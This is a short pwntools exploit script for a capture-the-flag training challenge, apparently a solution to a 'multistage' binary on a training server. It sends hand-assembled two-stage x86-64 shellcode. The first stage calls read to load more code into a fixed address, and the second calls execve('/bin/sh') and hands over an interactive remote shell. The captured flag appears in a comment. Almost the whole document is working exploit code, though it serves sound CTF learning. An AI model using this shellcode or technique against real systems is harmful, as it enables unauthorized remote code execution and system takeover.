from pwn import *
r = remote("bin.training.jinblack.it", 2003)

#first stage: read, with the following assembly:
#xor rax, rax
#xor rdi, rdi
#mov esi, 0x404070
#mov edx, 0x100
#syscall
#this shellcode is less long than 20 bytes, I need the read since I can't execute the execve with a buffer that is long less than 20 bytes

stage_one = b"\x48\x31\xC0\x48\x31\xFF\xBE\x70\x40\x40\x00\xBA\x00\x01\x00\x00\x0F\x05"


#second stage: execve, with the following assembly:
#mov eax, 0x3b
#mov rdi, 0x404070
#mov rsi, 0x404078
#mov rdx, rsi
#syscall

stage_two = b"\xB8\x3B\x00\x00\x00\x48\xC7\xC7\x70\x40\x40\x00\x48\xC7\xC6\x78\x40\x40\x00\x48\x89\xF2\x0F\x05"

payload2 = b"/bin/sh\x00" + b"\x00"*8 + b"\x90"*20 + stage_two


r.send(stage_one)
r.send(payload2)

r.interactive()

#flag{multistage_is_is_way_easier}

# issue with this challenge: it usually (but not always) works running the script with the command python multistage.py, 
# and not python3 multistage.py (just a few times)